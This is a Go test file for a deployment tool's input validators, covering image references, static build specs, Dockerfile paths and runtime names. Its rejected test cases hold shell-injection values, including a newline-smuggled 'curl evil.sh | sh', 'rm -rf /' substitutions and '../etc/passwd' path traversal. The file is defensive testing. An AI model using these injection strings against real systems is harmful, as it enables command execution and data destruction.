package projects

import (
	"errors"
	"strings"
	"testing"
)

func TestValidateImageRef(t *testing.T) {
	cases := []struct {
		in     string
		wantOK bool
	}{
		// Empty is allowed (chart applies its default).
		{"", true},
		{"nginx", true},
		{"nginx:1.27-alpine", true},
		{"ghcr.io/owner/repo:v1.0", true},
		{"ghcr.io/owner/repo@sha256:abc123", true},
		{"registry.local:5000/proj/svc:tag", true},
		// Shell-injection attempts from pass-4 Sec F-03:
		{"nginx\nRUN curl evil.sh | sh", false},
		{"nginx\rRUN echo gotcha", false},
		{"$(rm -rf /)", false},
		{"nginx;rm", false},
		{"nginx`whoami`", false},
		{"nginx && evil", false},
		{"nginx|evil", false},
		{"nginx 'second arg'", false}, // space
		{"nginx\tx", false},           // tab
	}
	for _, c := range cases {
		err := validateImageRef("test.field", c.in)
		if c.wantOK && err != nil {
			t.Errorf("validateImageRef(%q) want ok, got %v", c.in, err)
		}
		if !c.wantOK && err == nil {
			t.Errorf("validateImageRef(%q) want err, got nil", c.in)
		}
	}
	// Length cap.
	long := strings.Repeat("a", 256)
	if err := validateImageRef("test.field", long); err == nil {
		t.Error("validateImageRef on >255 chars should fail")
	}
}

func TestValidateStaticSpec(t *testing.T) {
	nilOK := validateStaticSpec(nil)
	if nilOK != nil {
		t.Errorf("nil spec should pass: %v", nilOK)
	}
	// outputDir injection — same shape as repo.path. The static-plan
	// init container does `COPY $OUTPUT_DIR ...`.
	bad := &ServiceStaticSpec{OutputDir: "../etc/passwd"}
	if err := validateStaticSpec(bad); err == nil {
		t.Error("outputDir traversal should fail")
	}
	bad2 := &ServiceStaticSpec{OutputDir: "/abs"}
	if err := validateStaticSpec(bad2); err == nil {
		t.Error("outputDir absolute should fail")
	}
	bad3 := &ServiceStaticSpec{OutputDir: "dist; rm"}
	if err := validateStaticSpec(bad3); err == nil {
		t.Error("outputDir with shell-meta should fail")
	}
	// Image fields go through validateImageRef.
	bad4 := &ServiceStaticSpec{RuntimeImage: "nginx\nRUN evil"}
	if err := validateStaticSpec(bad4); err == nil {
		t.Error("runtimeImage with newline should fail")
	}
	bad5 := &ServiceStaticSpec{BuilderImage: "node\nRUN bad"}
	if err := validateStaticSpec(bad5); err == nil {
		t.Error("builderImage with newline should fail")
	}
	// buildCmd is intentionally NOT validated (user's own build script).
	good := &ServiceStaticSpec{
		BuilderImage: "node:20-alpine",
		RuntimeImage: "nginx:1.27-alpine",
		BuildCmd:     "npm run build && cp -r out /workspace/dist",
		OutputDir:    "dist",
	}
	if err := validateStaticSpec(good); err != nil {
		t.Errorf("legitimate spec should pass: %v", err)
	}
}

func TestValidateDockerfile(t *testing.T) {
	cases := []struct {
		in     string
		wantOK bool
	}{
		{"", true},                       // empty → chart default
		{"Dockerfile", true},
		{"apps/web/Dockerfile.dev", true},
		{"sub_dir/Docker-file", true},
		{"/etc/passwd", false},           // absolute
		{"../escape/Dockerfile", false},  // traversal
		{`Dockerfile";rm -rf /;"`, false}, // shell injection
		{"Docker file", false},           // space
		{"$(touch x)", false},            // command substitution
	}
	for _, c := range cases {
		err := validateDockerfile(c.in)
		if c.wantOK && err != nil {
			t.Errorf("validateDockerfile(%q) want ok, got %v", c.in, err)
		}
		if !c.wantOK && err == nil {
			t.Errorf("validateDockerfile(%q) want error, got nil", c.in)
		}
	}
}

func TestValidateRuntime(t *testing.T) {
	cases := []struct {
		in         string
		wantOK     bool
		wantSubstr string
	}{
		{"", true, ""},
		{"dockerfile", true, ""},
		{"nixpacks", true, ""},
		{"buildpacks", true, ""},
		{"static", true, ""},
		{"wat", false, "unknown runtime"},
	}
	for _, c := range cases {
		err := validateRuntime(c.in)
		if c.wantOK {
			if err != nil {
				t.Errorf("validateRuntime(%q) want ok, got %v", c.in, err)
			}
			continue
		}
		if err == nil {
			t.Errorf("validateRuntime(%q) want err, got nil", c.in)
			continue
		}
		if !errors.Is(err, ErrInvalid) {
			t.Errorf("validateRuntime(%q) want errors.Is(err, ErrInvalid); err=%v", c.in, err)
		}
		if c.wantSubstr != "" && !strings.Contains(err.Error(), c.wantSubstr) {
			t.Errorf("validateRuntime(%q) error %q missing %q", c.in, err.Error(), c.wantSubstr)
		}
	}
}
